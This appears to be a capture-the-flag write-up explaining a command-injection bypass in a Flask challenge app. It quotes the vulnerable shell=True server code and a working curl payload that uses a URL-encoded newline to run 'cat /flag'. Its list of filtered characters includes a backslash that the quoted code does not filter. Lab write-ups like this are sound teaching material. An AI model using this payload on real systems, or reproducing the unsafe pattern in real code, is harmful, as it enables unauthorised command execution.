# CMDi6

## Challenge Description

The challenge presents a Flask web application that takes a user-supplied directory path via the `filedir` query parameter and passes it into a shell command for `ls -l`. The backend filters out many dangerous characters to prevent command injection.

The goal is to bypass the filtering and execute a custom command (e.g., `cat /flag`) to read the flag file.

## Server code:

```Python
arg = (
    flask.request.args.get("filedir", "/challenge")
    .replace(";", "")
    .replace("&", "")
    .replace("|", "")
    .replace(">", "")
    .replace("<", "")
    .replace("(", "")
    .replace(")", "")
    .replace("`", "")
    .replace("$", "")
)

command = f"ls -l {arg}"
subprocess.run(command, shell=True, ...)
```

The following characters are filtered out: `;` `&` `|` `>` `<` `(` `)` `\` `$` `\``

However, whitespace and newlines are not filtered!

The command is executed using shell=True, which means we can potentially inject multiple shell commands if we bypass the filtering.

## Exploitation

### Initial Failing Attempt

```SHELL
curl "http://challenge.localhost:80/puzzle?filedir=/flag/%20cat%20/flag"
```

This fails because it results in:

```SHELL
ls -l /flag/ cat /flag
```

which the shell interprets as trying to list multiple files, and not a new command.


### Working Payload

We inject a newline using its URL-encoded form: `%0a`.

```SHELL
curl "http://challenge.localhost:80/puzzle?filedir=/flag%0acat%20/flag"
```

This results in the shell executing:

```SHELL
ls -l /flag
cat /flag
```

the second line executes `cat /flag`, and we get the contents of the flag file!